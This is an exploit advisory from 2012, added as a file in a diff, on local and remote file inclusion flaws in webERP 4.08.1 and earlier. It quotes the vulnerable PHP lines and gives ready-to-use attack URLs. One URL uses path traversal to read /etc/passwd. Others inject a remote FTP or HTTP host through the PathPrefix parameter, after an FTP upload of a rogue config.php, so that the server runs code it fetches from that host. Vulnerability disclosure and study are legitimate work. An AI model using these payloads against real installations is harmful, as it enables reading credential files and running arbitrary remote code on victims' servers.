@@ -1,0 +1,95 @@
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+	
+   [ Discovered by dun \ posdub[at]gmail.com ]
+   [ 2012-06-27                              ]
+ ###################################################################
+ # [ webERP <= 4.08.1 ] Local/Remote File Inclusion Vulnerability  #
+ ###################################################################
+ #
+ # Script: "Accounting & Best Practice Business Administration System"
+ #
+ # Vendor:   http://www.weberp.org/
+ # Download: http://sourceforge.net/projects/web-erp/files/
+ #
+ # File: ./webERP/index.php (line: 4)
+ #   1    <?php
+ #   2    $PageSecurity=0;
+ #   3
+ #   4    include('includes/session.inc');                    // 1
+ #  ..cut..
+ #
+ # File: ./webERP/includes/session.inc (lines: 4-16)
+ #  ..cut..
+ #   4    if (!isset($PathPrefix)) {                          // 2
+ #   5        $PathPrefix='';
+ #   6    }
+ #   7
+ #   8
+ #   9    if (!file_exists($PathPrefix . 'config.php')){      // 3
+ #  10        $rootpath = dirname(htmlspecialchars($_SERVER['PHP_SELF'],ENT_QUOTES,'UTF-8'));
+ #  11        if ($rootpath == '/' OR $rootpath == "\\") {
+ #  12            $rootpath = '';
+ #  13        }
+ #  14        header('Location:' . $rootpath . '/install/index.php');
+ #  15    }
+ #  16    include($PathPrefix . 'config.php');                // 4 [LFI]/[RFI]
+ #  ..cut..
+ #    
+ # [LFI] ( magic_quotes_gpc = Off; )
+ # Vuln: http://localhost/webERP/index.php?PathPrefix=../../../../../../etc/passwd%00
+ #
+ # [RFI #1] ( allow_url_fopen = On; allow_url_include = On; register_globals = On; )
+ # It is possible to bypass line: (!file_exists($PathPrefix . 'config.php')),
+ # when we use some url wrappers. For example ftp://
+ # Example:
+ #
+ # dun@rd01 ~ $ cat ./config.php
+ #  <?php phpinfo(); ?>
+ # dun@rd01 ~ $ ftp ftp.server.com
+ #  Connected to ftp.server.com.
+ #  Name (ftp.server.com): user
+ #  331 User user OK. Password required
+ #  Password:
+ #  230 OK. Current restricted directory is /
+ #  ftp> put config.php
+ #  local: config.php remote: config.php
+ #  200 PORT command successful
+ #  226 File successfully transferred
+ #  ftp> quit
+ #  221 Logout.
+ #
+ # Now we can use url:
+ # Vuln: http://localhost/webERP/index.php?PathPrefix=ftp://user:password@ftp.server.com/
+ # In this case, script checks if the file 'ftp://user:password@ftp.server.com/' . 'config.php' does not exist.
+ # If exist, then include it.
+ #
+ ###################################################################
+ #
+ # [RFI #2] ( allow_url_include = On; register_globals = On; ) 
+ #
+ # File: ./webERP/includes/LanguageSetup.php (lines: 29-84)
+ #  ..cut.. 
+ #  29    if (!function_exists('gettext')) {
+ #  ..cut..
+ #  34        require_once($PathPrefix . 'includes/php-gettext/streams.php');
+ #  ..cut..
+ #  64    } else {
+ #  65        include($PathPrefix . 'includes/LanguagesArray.php');
+ #  ..cut..
+ #  84    }
+ #  ..cut..
+ #
+ # Vuln: http://localhost/webERP/includes/LanguageSetup.php?PathPrefix=http://localhost/phpinfo.txt?
+ #
+ ### [ dun / 2012 ] #####################################################
+ 
+ 
+ 
+ 
+ 
+ 
